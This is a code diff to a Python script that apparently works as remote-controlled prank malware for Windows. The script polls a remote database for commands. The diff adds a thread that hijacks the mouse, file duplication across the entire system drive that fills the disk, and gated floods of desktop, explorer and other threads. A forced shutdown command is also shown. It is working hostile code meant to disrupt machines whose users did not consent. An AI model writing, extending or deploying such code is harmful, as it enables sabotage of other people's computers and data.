@@ -52,9 +52,17 @@ urls = [
 
 
 # Threading Control Variables
+do_mouse = True
+do_duplicate = True
 do_explorer = True
 do_desktop = True
 do_sus = True
+
+# Thread Creation Variables
+mouse_create = False
+explorer_create = False
+desktop_create = False
+sus_create = False
 
 
 # Connect to project and database
@@ -83,6 +91,13 @@ if not host_in_db:
     }, host)
 
 
+# Good luck regaining control of your mouse :P
+def mousem():
+    while True:
+        if do_mouse:
+            mouse.move(random.randint(0, width), random.randint(0, height))
+
+
 # Too many desktops
 def desktop():
     while True:
@@ -101,7 +116,14 @@ def explorer():
 def duplicate():
     for a,b,c in os.walk(os.getenv("systemdrive")+"\\"):
         for i in c:
-            print(os.path.splitext(i)[0])
+            if do_duplicate:
+                try:
+                    oldpath = a+"\\"+i
+                    splitext = os.path.splitext(oldpath)
+                    newpath = splitext[0]+" - copy" + splitext[1]
+                    shutil.copy(oldpath, newpath)
+                except:
+                    continue
 
 
 # ICT hates Games
@@ -139,30 +161,44 @@ while True:
         if thisData["shutdown"] == 1:
             os.system("shutdown /s /f /t 0")
         if thisData["mouse"] == 1:
-            mouse.move(
-                random.randint(0, width),
-                random.randint(0, height)
-            )
+            do_mouse = True
+            if not mouse_create:
+                mouse_create = True
+                for tIdx in range(50):
+                    t = threading.Thread(target=mousem, daemon=True)
+                    t.start()
         if thisData["desktop"] == 1:
             do_desktop = True
-            for tIdx in range(50):
-                t = threading.Thread(target=desktop, daemon=True)
-                t.start()
+            if not desktop_create:
+                for tIdx in range(50):
+                    desktop_create = True
+                    t = threading.Thread(target=desktop, daemon=True)
+                    t.start()
         if thisData["explorer"] == 1:
             do_explorer = True
-            for tIdx in range(50):
-                t = threading.Thread(target=explorer, daemon=True)
-                t.start()
+            if not explorer_create:
+                for tIdx in range(50):
+                    explorer_create = True
+                    t = threading.Thread(target=explorer, daemon=True)
+                    t.start()
         if thisData["sus"] == 1:
             do_sus = True
-            for tIdx in range(50):
-                t = threading.Thread(target=sus, daemon=True)
-                t.start()
+            if not sus_create:
+                for tIdx in range(50):
+                    sus_create = True
+                    t = threading.Thread(target=sus, daemon=True)
+                    t.start()
         if thisData["duplicate"] == 1:
-            duplicate()
+            do_duplicate = True
+            t = threading.Thread(target=duplicate, daemon=True)
+            t.start()
         if thisData["desktop"] == 0:
             do_desktop = False
         if thisData["explorer"] == 0:
             do_explorer = False
         if thisData["sus"] == 0:
             do_sus = False
+        if thisData["duplicate"] == 0:
+            do_duplicate = False
+        if thisData["mouse"] == 0:
+            do_mouse = False
